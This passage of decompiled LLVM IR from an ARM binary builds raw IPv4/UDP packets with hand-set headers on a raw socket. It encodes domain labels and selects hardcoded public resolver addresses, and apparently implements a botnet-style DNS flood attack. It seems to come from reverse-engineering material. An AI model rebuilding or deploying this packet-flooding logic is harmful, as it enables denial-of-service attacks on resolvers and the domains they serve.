  %v7_ec10 = icmp eq i8 %v2_ebe8, 46
  store i1 %v7_ec10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec10, label %dec_label_pc_ebcc, label %bb139

bb139:                                            ; preds = %dec_label_pc_ec10
  %v8_ec14 = icmp eq i32 %v1_ebf8, 9
  store i1 %v8_ec14, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_ebf8, 10
  br i1 %tmp, label %dec_label_pc_ebcc, label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ebcc, %bb139
  %v0_ebd8.lcssa = phi i32 [ %v1_ebf0, %dec_label_pc_ebcc ], [ %v0_ebd8, %bb139 ]
  %v2_ec20 = sub i32 %v0_ebd8.lcssa, %v0_eb98
  store i32 %v2_ec20, i32* %r2.global-to-local, align 4
  store i32 %v2_ebb8, i32* %r1.global-to-local, align 4
  store i32 %v2_ebc0, i32* %r0.global-to-local, align 4
  %v3_ec2c = call i32 @function_13ad0(i32 %v2_ebc0, i32 %v2_ebb8, i32 %v2_ec20)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ebc0, i32* @r0, align 4
  %v2_ec3c = load i32, i32* %r7.global-to-local, align 4
  %v3_ec3c = inttoptr i32 %v2_ec3c to i8*
  store i8 0, i8* %v3_ec3c, align 1
  %v0_ec40 = call i32 @_inet_addr()
  store i32 %v0_ec40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec48

dec_label_pc_ec4821:                              ; preds = %dec_label_pc_f108
  unreachable

dec_label_pc_ec48:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f170, %dec_label_pc_f164, %dec_label_pc_f150, %dec_label_pc_ec1c
  %v29_f14c75 = phi i32 [ %v1_f10c, %dec_label_pc_f180 ], [ %v1_f10c, %dec_label_pc_f170 ], [ %v1_f10c, %dec_label_pc_f164 ], [ %v1_f10c, %dec_label_pc_f150 ], [ %v0_ec40, %dec_label_pc_ec1c ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_f180 ], [ 104859200, %dec_label_pc_f170 ], [ 707416650, %dec_label_pc_f164 ], [ 134744072, %dec_label_pc_f150 ], [ %v0_ec40, %dec_label_pc_ec1c ]
  store i32 %v6_eb0c, i32* %ip.global-to-local, align 4
  %v2_ec4c = icmp eq i32 %v6_eb0c, 0
  store i1 %v2_ec4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec4c, label %dec_label_pc_f144, label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec48
  store i32 %v6_eb0c, i32* %r0.global-to-local, align 4
  %v1_ec58 = inttoptr i32 %v6_eb0c to i8*
  %v2_ec58 = call i32 @function_13a54(i8* %v1_ec58)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ec6c = call i32 @_socket(i32 2, i32 3, i32 17)
  store i32 %v3_ec6c, i32* %r0.global-to-local, align 4
  %v7_ec70 = icmp eq i32 %v3_ec6c, -1
  store i1 %v7_ec70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec70, label %dec_label_pc_f144, label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec54
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ec88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ec88, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ec9c = call i32 @_setsockopt()
  store i32 %v0_ec9c, i32* %r0.global-to-local, align 4
  %v7_eca0 = icmp eq i32 %v0_ec9c, -1
  store i1 %v7_eca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eca0, label %dec_label_pc_f13c, label %dec_label_pc_eca8

dec_label_pc_eca8:                                ; preds = %dec_label_pc_ec7c
  store i32 %v1_e9f8, i32* %r0.global-to-local, align 4
  %v3_ecb0 = mul i32 %v7_ea4c, 65536
  store i32 %v3_ecb0, i32* %lr.global-to-local, align 4
  %v0_ecb4 = load i32, i32* @sl, align 4
  %v3_ecb4 = mul i32 %v0_ecb4, 65536
  store i32 %v3_ecb4, i32* %sl.global-to-local, align 4
  %v0_ecb8 = load i32, i32* %r8.global-to-local, align 4
  %v0_ecbc = load i32, i32* %fp.global-to-local, align 4
  %v3_ecbc = mul i32 %v0_ecbc, 65536
  store i32 %v3_ecbc, i32* %r5.global-to-local, align 4
  %v0_ecc0 = load i32, i32* %sb.global-to-local, align 4
  %v3_ecc0 = mul i32 %v0_ecc0, 65536
  store i32 %v3_ecc0, i32* %sb.global-to-local, align 4
  %v5_ecc4 = trunc i32 %v0_ecb8 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_eccc = urem i32 %v7_ea4c, 65536
  store i32 %v3_eccc, i32* %r2.global-to-local, align 4
  %v3_ecd0 = urem i32 %v0_ecbc, 65536
  store i32 %v3_ecd0, i32* %r3.global-to-local, align 4
  %v3_ecd4 = urem i32 %v0_ecc0, 65536
  store i32 %v3_ecd4, i32* %r4.global-to-local, align 4
  %v3_ecd8 = urem i32 %v0_ecb4, 65536
  store i32 %v3_ecd8, i32* %r8.global-to-local, align 4
  %v2_ecdc = icmp eq i32 %v1_e9f8, 0
  store i1 %v2_ecdc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_ecdc, label %dec_label_pc_f12c, label %dec_label_pc_ed00

dec_label_pc_ed00:                                ; preds = %dec_label_pc_eca8
  %v4_ed04 = sext i8 %v5_ecc4 to i32
  %v2_ed08 = add i32 %v4_ed04, %v2_ec58
  store i32 %v2_ed08, i32* @fp, align 4
  %v3_ed0c = mul i32 %v2_ed08, 65536
  %v1_ed10 = add i32 %v3_ed0c, 1769472
  store i32 %v1_ed10, i32* %r6.global-to-local, align 4
  %v1_ed14 = add i32 %v3_ed0c, 3080192
  %v1_ed28 = urem i32 %v0_ecb4, 256
  %v3_ed38 = udiv i32 %v1_ed10, 256
  %v1_ed3c = urem i32 %v7_ea4c, 256
  %v1_ed40 = and i32 %v3_ed38, 65280
  %v1_ed44 = urem i32 %v0_ecc0, 256
  %v3_ed48 = mul nuw nsw i32 %v1_ed28, 256
  %v1_ed50 = urem i32 %v0_ecbc, 256
  %v3_ed54 = mul nuw nsw i32 %v1_ed44, 256
  %tmp140 = udiv i32 %v0_ecb4, 256
  %v4_ed58 = urem i32 %tmp140, 256
  %v5_ed58 = or i32 %v4_ed58, %v3_ed48
  store i32 %v5_ed58, i32* %r8.global-to-local, align 4
  %v4_ed5c = udiv i32 %v1_ed10, 16777216
  %v5_ed5c = or i32 %v1_ed40, %v4_ed5c
  store i32 %v5_ed5c, i32* %sl.global-to-local, align 4
  %tmp141 = udiv i32 %v0_ecbc, 256
  %v3_ed68 = urem i32 %tmp141, 256
  %v4_ed6c = sdiv i32 %v1_ed14, 16777216
  %tmp142 = udiv i32 %v7_ea4c, 256
  %v4_ed74 = mul nuw nsw i32 %v1_ed50, 256
  %v5_ed74 = or i32 %v4_ed74, %v3_ed68
  store i32 %v5_ed74, i32* %r5.global-to-local, align 4
  %tmp143 = udiv i32 %v0_ecc0, 256
  %v4_ed78 = urem i32 %tmp143, 256
  %v5_ed78 = or i32 %v4_ed78, %v3_ed54
  store i32 %v5_ed78, i32* %sb.global-to-local, align 4
  store i32 %v1_ed3c, i32* %r0.global-to-local, align 4
  %v1_ed84 = add i32 %v2_ec58, 1
  store i32 %v1_ed84, i32* %r7.global-to-local, align 4
  %v3_ed88 = ashr i32 %v1_ed14, 31
  store i32 %v3_ed88, i32* %lr.global-to-local, align 4
  store i32 %v1_ed50, i32* %r1.global-to-local, align 4
  store i32 %v1_ed44, i32* %r2.global-to-local, align 4
  %v3_ed9476 = udiv i32 %v1_ed40, 256
  store i32 %v3_ed9476, i32* %r3.global-to-local, align 4
  store i32 %v1_ed28, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_edf8 = sext i8 %v5_ea48 to i32
  %sext14 = mul i32 %v6_ea64, 16777216
  %v4_ee10 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %tmp142, 16777216
  %v4_ee24 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v7_ea4c, 16777216
  %v4_ee28 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_ed10, 256
  %v4_ee58 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_ecc0, 16777216
  %v4_ee5c = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_ecbc, 16777216
  %v4_ee80 = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_ecb4, 16777216
  %v4_ee8c = sdiv i32 %sext20, 16777216
  %v1_ee08 = trunc i32 %v4_ed6c to i8
  %extract.t = trunc i32 %v3_ed88 to i8
  br label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_ed00
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_edc0 = call i32 @_calloc(i32 600, i32 1)
  store i32 %v2_edc0, i32* %r0.global-to-local, align 4
  store i32 %v2_ea10, i32* %lr.global-to-local, align 4
  %v3_edc8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_edc8, i32* %r3.global-to-local, align 4
  %v2_edcc = load i32, i32* %r4.global-to-local, align 4
  %v5_edcc = mul i32 %v2_edcc, 4
  %v6_edcc = add i32 %v5_edcc, %v2_ea10
  %v7_edcc = inttoptr i32 %v6_edcc to i32*
  store i32 %v2_edc0, i32* %v7_edcc, align 4
  %v0_edd0 = load i32, i32* %lr.global-to-local, align 4
  %v1_edd0 = load i32, i32* %r3.global-to-local, align 4
  %v4_edd0 = mul i32 %v1_edd0, 4
  %v5_edd0 = add i32 %v4_edd0, %v0_edd0
  %v6_edd0 = inttoptr i32 %v5_edd0 to i32*
  %v7_edd0 = load i32, i32* %v6_edd0, align 4
  store i32 %v7_edd0, i32* %r1.global-to-local, align 4
  %v1_edd4 = inttoptr i32 %v7_edd0 to i8*
  %v2_edd4 = load i8, i8* %v1_edd4, align 1
  %tmp155 = urem i8 %v2_edd4, 16
  %v1_edd8 = zext i8 %tmp155 to i32
  %v1_eddc = or i32 %v1_edd8, 64
  store i32 %v1_eddc, i32* %r2.global-to-local, align 4
  %v1_ede0 = trunc i32 %v1_eddc to i8
  store i8 %v1_ede0, i8* %v1_edd4, align 1
  %v0_ede4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ede4 = inttoptr i32 %v0_ede4 to i8*
  %v2_ede4 = load i8, i8* %v1_ede4, align 1
  %v1_ede8 = and i8 %v2_ede4, -16
  %v1_edec = or i8 %v1_ede8, 5
  store i32 %v1_ea90, i32* %r0.global-to-local, align 4
  store i8 %v1_edec, i8* %v1_ede4, align 1
  store i32 %v4_edf8, i32* %r2.global-to-local, align 4
  %v2_edfc = load i32, i32* %r1.global-to-local, align 4
  %v3_edfc = add i32 %v2_edfc, 1
  %v4_edfc = inttoptr i32 %v3_edfc to i8*
  store i8 %v5_ea48, i8* %v4_edfc, align 1
  store i32 %v4_ed6c, i32* %r3.global-to-local, align 4
  %v0_ee04 = load i32, i32* %r0.global-to-local, align 4
  %v2_ee04 = icmp eq i32 %v0_ee04, 0
  store i1 %v2_ee04, i1* %cpsr_z.global-to-local, align 1
  %v2_ee08 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee08 = add i32 %v2_ee08, 2
  %v4_ee08 = inttoptr i32 %v3_ee08 to i8*
  store i8 %v1_ee08, i8* %v4_ee08, align 1
  store i32 %v3_ed88, i32* %r4.global-to-local, align 4
  store i32 %v4_ee10, i32* %r0.global-to-local, align 4
  %v0_ee14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee14, label %.thread22, label %bb144

bb144:                                            ; preds = %dec_label_pc_edb8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ee18 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee18 = add i32 %v3_ee18, 6
  %v5_ee18 = inttoptr i32 %v4_ee18 to i8*
  store i8 64, i8* %v5_ee18, align 1
  %v0_ee20.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t77 = trunc i32 %v0_ee20.pre to i8
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_edb8, %bb144
  %v0_ee20.off0 = phi i8 [ %extract.t, %dec_label_pc_edb8 ], [ %extract.t77, %bb144 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_ee20 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee20 = add i32 %v2_ee20, 3
  %v4_ee20 = inttoptr i32 %v3_ee20 to i8*
  store i8 %v0_ee20.off0, i8* %v4_ee20, align 1
  store i32 %v4_ee24, i32* %ip.global-to-local, align 4
  store i32 %v4_ee28, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* %r4.global-to-local, align 4
  %v0_ee30 = load i32, i32* %r0.global-to-local, align 4
  %v1_ee30 = trunc i32 %v0_ee30 to i8
  %v2_ee30 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee30 = add i32 %v2_ee30, 8
  %v4_ee30 = inttoptr i32 %v3_ee30 to i8*
  store i8 %v1_ee30, i8* %v4_ee30, align 1
  %v0_ee34 = load i32, i32* %r3.global-to-local, align 4
  %v1_ee34 = trunc i32 %v0_ee34 to i8
  %v2_ee34 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee34 = add i32 %v2_ee34, 9
  %v4_ee34 = inttoptr i32 %v3_ee34 to i8*
  store i8 %v1_ee34, i8* %v4_ee34, align 1
  %v0_ee38 = load i32, i32* %lr.global-to-local, align 4
  %v1_ee38 = trunc i32 %v0_ee38 to i8
  %v2_ee38 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee38 = add i32 %v2_ee38, 5
  %v4_ee38 = inttoptr i32 %v3_ee38 to i8*
  store i8 %v1_ee38, i8* %v4_ee38, align 1
  %v0_ee3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee3c, label %.thread23, label %bb145

.thread23:                                        ; preds = %.thread22
  %v2_ee4024 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_ee4024, i32* %r3.global-to-local, align 4
  store i32 %v4_ed04, i32* %lr.global-to-local, align 4
  br label %bb146

bb145:                                            ; preds = %.thread22
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ee40 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_ee40, i32* %r3.global-to-local, align 4
  store i32 %v4_ed04, i32* %lr.global-to-local, align 4
  %v3_ee48 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee48 = add i32 %v3_ee48, 7
  %v5_ee48 = inttoptr i32 %v4_ee48 to i8*
  store i8 0, i8* %v5_ee48, align 1
  %v0_ee50.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_ee54.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread23, %bb145
  %v0_ee54 = phi i32 [ %v2_ee4024, %.thread23 ], [ %v0_ee54.pre, %bb145 ]
  %v0_ee50 = phi i32 [ %v4_ed04, %.thread23 ], [ %v0_ee50.pre, %bb145 ]
  %v0_ee4c = load i32, i32* %r1.global-to-local, align 4
  %v1_ee4c = add i32 %v0_ee50, 41
  %v2_ee50 = add i32 %v1_ee4c, %v0_ee4c
  store i32 %v2_ee50, i32* %r4.global-to-local, align 4
  %v2_ee54 = add i32 %v0_ee4c, 12
  %v3_ee54 = inttoptr i32 %v2_ee54 to i32*
  store i32 %v0_ee54, i32* %v3_ee54, align 4
  store i32 %v4_ee58, i32* %r2.global-to-local, align 4
  store i32 %v4_ee5c, i32* %r3.global-to-local, align 4
  %v0_ee60 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee60 = add i32 %v0_ee60, 20
  store i32 %v1_ee60, i32* %r0.global-to-local, align 4
  %v0_ee64 = load i32, i32* %ip.global-to-local, align 4
  %v1_ee64 = trunc i32 %v0_ee64 to i8
  %v3_ee64 = add i32 %v0_ee60, 4
  %v4_ee64 = inttoptr i32 %v3_ee64 to i8*
  store i8 %v1_ee64, i8* %v4_ee64, align 1
  %v0_ee68 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee68 = trunc i32 %v0_ee68 to i8
  %v2_ee68 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee68 = add i32 %v2_ee68, 5
  %v4_ee68 = inttoptr i32 %v3_ee68 to i8*
  store i8 %v1_ee68, i8* %v4_ee68, align 1
  %v0_ee6c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee6c = trunc i32 %v0_ee6c to i8
  %v2_ee6c = load i32, i32* %r0.global-to-local, align 4
  %v3_ee6c = add i32 %v2_ee6c, 3
  %v4_ee6c = inttoptr i32 %v3_ee6c to i8*
  store i8 %v1_ee6c, i8* %v4_ee6c, align 1
  %v0_ee70 = load i32, i32* %sb.global-to-local, align 4
  %v1_ee70 = trunc i32 %v0_ee70 to i8
  %v2_ee70 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee70 = add i32 %v2_ee70, 2
  %v4_ee70 = inttoptr i32 %v3_ee70 to i8*
  store i8 %v1_ee70, i8* %v4_ee70, align 1
  %v0_ee74 = load i32, i32* %sl.global-to-local, align 4
  %v1_ee74 = trunc i32 %v0_ee74 to i8
  %v2_ee74 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee74 = add i32 %v2_ee74, 4
  %v4_ee74 = inttoptr i32 %v3_ee74 to i8*
  store i8 %v1_ee74, i8* %v4_ee74, align 1
  %v0_ee78 = load i32, i32* %r5.global-to-local, align 4
  %v1_ee78 = trunc i32 %v0_ee78 to i8
  %v2_ee78 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee78 = add i32 %v2_ee78, 20
  %v4_ee78 = inttoptr i32 %v3_ee78 to i8*
  store i8 %v1_ee78, i8* %v4_ee78, align 1
  store i32 %v4_ee80, i32* %r2.global-to-local, align 4
  %v1_ee84 = load i32, i32* %r1.global-to-local, align 4
  %v2_ee84 = add i32 %v1_ee84, 16
  %v3_ee84 = inttoptr i32 %v2_ee84 to i32*
  store i32 %stack_var_-2176.0, i32* %v3_ee84, align 4
  %v0_ee88 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee88 = trunc i32 %v0_ee88 to i8
  %v2_ee88 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee88 = add i32 %v2_ee88, 1
  %v4_ee88 = inttoptr i32 %v3_ee88 to i8*
  store i8 %v1_ee88, i8* %v4_ee88, align 1
  store i32 %v4_ee8c, i32* %lr.global-to-local, align 4
  store i32 %v4_ed04, i32* %r0.global-to-local, align 4
  %v0_ee94 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee94 = add i32 %v0_ee94, 28
  store i32 %v1_ee94, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_eea0 = load i32, i32* %r8.global-to-local, align 4
  %v1_eea0 = trunc i32 %v0_eea0 to i8
  %v4_eea0 = inttoptr i32 %v1_ee94 to i8*
  store i8 %v1_eea0, i8* %v4_eea0, align 1
  %v0_eea4 = load i32, i32* %r3.global-to-local, align 4
  %v1_eea4 = trunc i32 %v0_eea4 to i8
  %v2_eea4 = load i32, i32* %ip.global-to-local, align 4
  %v3_eea4 = add i32 %v2_eea4, 5
  %v4_eea4 = inttoptr i32 %v3_eea4 to i8*
  store i8 %v1_eea4, i8* %v4_eea4, align 1
  %v0_eea8 = load i32, i32* %lr.global-to-local, align 4
  %v1_eea8 = trunc i32 %v0_eea8 to i8
  %v2_eea8 = load i32, i32* %ip.global-to-local, align 4
  %v3_eea8 = add i32 %v2_eea8, 1
  %v4_eea8 = inttoptr i32 %v3_eea8 to i8*
  store i8 %v1_eea8, i8* %v4_eea8, align 1
  %v0_eeac = load i32, i32* %r3.global-to-local, align 4
  %v1_eeac = trunc i32 %v0_eeac to i8
  %v2_eeac = load i32, i32* %ip.global-to-local, align 4
  %v3_eeac = add i32 %v2_eeac, 2
  %v4_eeac = inttoptr i32 %v3_eeac to i8*
  store i8 %v1_eeac, i8* %v4_eeac, align 1
  %v0_eeb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_eeb0 = trunc i32 %v0_eeb0 to i8
  %v2_eeb0 = load i32, i32* %ip.global-to-local, align 4
  %v3_eeb0 = add i32 %v2_eeb0, 3
  %v4_eeb0 = inttoptr i32 %v3_eeb0 to i8*
  store i8 %v1_eeb0, i8* %v4_eeb0, align 1
  %v0_eeb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_eeb4 = trunc i32 %v0_eeb4 to i8
  %v2_eeb4 = load i32, i32* %ip.global-to-local, align 4
  %v3_eeb4 = add i32 %v2_eeb4, 4
  %v4_eeb4 = inttoptr i32 %v3_eeb4 to i8*
  store i8 %v1_eeb4, i8* %v4_eeb4, align 1
  %v0_eeb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_eeb8 = trunc i32 %v0_eeb8 to i8
  %v2_eeb8 = load i32, i32* %r1.global-to-local, align 4
  %v3_eeb8 = add i32 %v2_eeb8, 40
  %v4_eeb8 = inttoptr i32 %v3_eeb8 to i8*
  store i8 %v1_eeb8, i8* %v4_eeb8, align 1
  store i32 %v6_eb0c, i32* %r1.global-to-local, align 4
  %v0_eec0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_eec0, i32* %r2.global-to-local, align 4
  %v0_eec4 = load i32, i32* %r4.global-to-local, align 4
  %v1_eec4 = add i32 %v0_eec4, 1
  store i32 %v1_eec4, i32* %r0.global-to-local, align 4
  %v3_eec8 = call i32 @function_13ad0(i32 %v1_eec4, i32 %v6_eb0c, i32 %v0_eec0)
  store i32 %v3_eec8, i32* %r0.global-to-local, align 4
  store i32 %v2_ec58, i32* %r1.global-to-local, align 4
  %v1_eed0 = load i32, i32* %r6.global-to-local, align 4
  %v9_eed0 = icmp eq i32 %v2_ec58, %v1_eed0
  store i1 %v9_eed0, i1* %cpsr_z.global-to-local, align 1
  %v7_eed4 = icmp sgt i32 %v2_ec58, %v1_eed0
  store i32 %v1_eed0, i32* %lr.global-to-local, align 4
  %v0_eee4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_eee4, i32* %r2.global-to-local, align 4
  %extract.t79 = trunc i32 %v1_eed0 to i8
  br i1 %v7_eed4, label %dec_label_pc_eee0, label %dec_label_pc_ef20

dec_label_pc_eee0:                                ; preds = %bb146
  store i32 %v1_eed0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eeec

dec_label_pc_eeec:                                ; preds = %bb149, %dec_label_pc_eee0
  %v0_ef0886152 = phi i32 [ %v0_ef0886153, %bb149 ], [ %v1_eed0, %dec_label_pc_eee0 ]
  %v1_eefc34 = phi i32 [ %v1_ef0c92, %bb149 ], [ %v1_eed0, %dec_label_pc_eee0 ]
  %v1_eef8.off0 = phi i8 [ %v1_eef857.off0, %bb149 ], [ %extract.t79, %dec_label_pc_eee0 ]
  %v0_eefc33 = phi i32 [ %v0_eefc335589, %bb149 ], [ %v0_eee4, %dec_label_pc_eee0 ]
  store i32 %v6_eb0c, i32* %ip.global-to-local, align 4
  %v2_eef0 = add i32 %v1_eefc34, %v6_eb0c
  %v3_eef0 = inttoptr i32 %v2_eef0 to i8*
  %v4_eef0 = load i8, i8* %v3_eef0, align 1
  %v6_eef0 = zext i8 %v4_eef0 to i32
  store i32 %v6_eef0, i32* %r3.global-to-local, align 4
  %v7_eef4 = icmp eq i8 %v4_eef0, 46
  store i1 %v7_eef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eef4, label %bb147, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_eeec
  %v2_eefc35 = add i32 %v1_eefc34, %v0_eefc33
  store i32 %v2_eefc35, i32* %r0.global-to-local, align 4
  br label %.thread36

bb147:                                            ; preds = %dec_label_pc_eeec
  %v3_eef8 = load i32, i32* %r2.global-to-local, align 4
  %v4_eef8 = inttoptr i32 %v3_eef8 to i8*
  store i8 %v1_eef8.off0, i8* %v4_eef8, align 1
  %v0_ef00.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_eefc = load i32, i32* %r4.global-to-local, align 4
  %v1_eefc = load i32, i32* %r1.global-to-local, align 4
  %v2_eefc = add i32 %v1_eefc, %v0_eefc
  store i32 %v2_eefc, i32* %r0.global-to-local, align 4
  br i1 %v0_ef00.pr, label %bb148, label %bb147..thread36_crit_edge

bb147..thread36_crit_edge:                        ; preds = %bb147
  %v0_ef0886.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread36

bb148:                                            ; preds = %bb147
  %v2_ef00 = add i32 %v2_eefc, 1
  store i32 %v2_ef00, i32* %r2.global-to-local, align 4
  store i32 %v2_ec58, i32* %r0.global-to-local, align 4
  %v0_ef08 = load i32, i32* %lr.global-to-local, align 4
  %v1_ef08 = add i32 %v0_ef08, 1
  store i32 %v1_ef08, i32* %ip.global-to-local, align 4
  %v1_ef0c = add i32 %v1_eefc, 1
  store i32 %v1_ef0c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb149

.thread36:                                        ; preds = %bb147..thread36_crit_edge, %.thread32
  %v0_ef0886 = phi i32 [ %v0_ef0886.pre, %bb147..thread36_crit_edge ], [ %v0_ef0886152, %.thread32 ]
  %v0_ef0c.ph = phi i32 [ %v1_eefc, %bb147..thread36_crit_edge ], [ %v1_eefc34, %.thread32 ]
  %v0_eefc3355.ph = phi i32 [ %v0_eefc, %bb147..thread36_crit_edge ], [ %v0_eefc33, %.thread32 ]
  store i32 %v2_ec58, i32* %r0.global-to-local, align 4
  %v1_ef0887 = add i32 %v0_ef0886, 1
  store i32 %v1_ef0887, i32* %ip.global-to-local, align 4
  %v1_ef0c88 = add i32 %v0_ef0c.ph, 1
  store i32 %v1_ef0c88, i32* %r1.global-to-local, align 4
  %v2_ef14 = urem i32 %v1_ef0887, 256
  store i32 %v2_ef14, i32* %lr.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ef0887 to i8
  br label %bb149

bb149:                                            ; preds = %bb148, %.thread36
  %v0_ef0886153 = phi i32 [ 0, %bb148 ], [ %v2_ef14, %.thread36 ]
  %v1_ef0c92 = phi i32 [ %v1_ef0c, %bb148 ], [ %v1_ef0c88, %.thread36 ]
  %v0_eefc335589 = phi i32 [ %v0_eefc, %bb148 ], [ %v0_eefc3355.ph, %.thread36 ]
  %v1_eef857.off0 = phi i8 [ 0, %bb148 ], [ %extract.t82, %.thread36 ]
  %v9_ef18 = icmp eq i32 %v2_ec58, %v1_ef0c92
  store i1 %v9_ef18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef18, label %dec_label_pc_ef20.loopexit, label %dec_label_pc_eeec

dec_label_pc_ef20.loopexit:                       ; preds = %bb149
  %v2_ef20.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef20

dec_label_pc_ef20:                                ; preds = %dec_label_pc_ef20.loopexit, %bb146
  %v2_ef20 = phi i32 [ %v2_ef20.pre, %dec_label_pc_ef20.loopexit ], [ %v0_eee4, %bb146 ]
  %v0_ef20.off0 = phi i8 [ %v1_eef857.off0, %dec_label_pc_ef20.loopexit ], [ %extract.t79, %bb146 ]
  %v3_ef20 = inttoptr i32 %v2_ef20 to i8*
  store i8 %v0_ef20.off0, i8* %v3_ef20, align 1
  %v3_ef24 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_ec58, i32* %r1.global-to-local, align 4
  %v0_ef2c = load i32, i32* %r4.global-to-local, align 4
  %v2_ef2c = add i32 %v0_ef2c, %v2_ec58
  store i32 %v2_ef2c, i32* %r3.global-to-local, align 4
  %v1_ef30 = add i32 %v3_ef24, 1
  store i32 %v1_ef30, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %lr.global-to-local, align 4
  %v9_ef40 = icmp eq i32 %v1_e9f8, %v1_ef30
  store i1 %v9_ef40, i1* %cpsr_z.global-to-local, align 1
  %v1_ef44 = add i32 %v2_ef2c, 2
  store i32 %v1_ef44, i32* %r2.global-to-local, align 4
  %v4_ef48 = inttoptr i32 %v1_ef44 to i8*
  store i8 0, i8* %v4_ef48, align 1
  %v0_ef4c = load i32, i32* %lr.global-to-local, align 4
  %v1_ef4c = trunc i32 %v0_ef4c to i8
  %v2_ef4c = load i32, i32* %r2.global-to-local, align 4
  %v3_ef4c = add i32 %v2_ef4c, 3
  %v4_ef4c = inttoptr i32 %v3_ef4c to i8*
  store i8 %v1_ef4c, i8* %v4_ef4c, align 1
  %v0_ef50 = load i32, i32* %lr.global-to-local, align 4
  %v1_ef50 = trunc i32 %v0_ef50 to i8
  %v2_ef50 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef50 = add i32 %v2_ef50, 1
  %v4_ef50 = inttoptr i32 %v3_ef50 to i8*
  store i8 %v1_ef50, i8* %v4_ef50, align 1
  %v0_ef54 = load i32, i32* %ip.global-to-local, align 4
  %v1_ef54 = trunc i32 %v0_ef54 to i8
  %v2_ef54 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef54 = add i32 %v2_ef54, 2
  %v4_ef54 = inttoptr i32 %v3_ef54 to i8*
  store i8 %v1_ef54, i8* %v4_ef54, align 1
  %v0_ef58 = load i32, i32* %r4.global-to-local, align 4
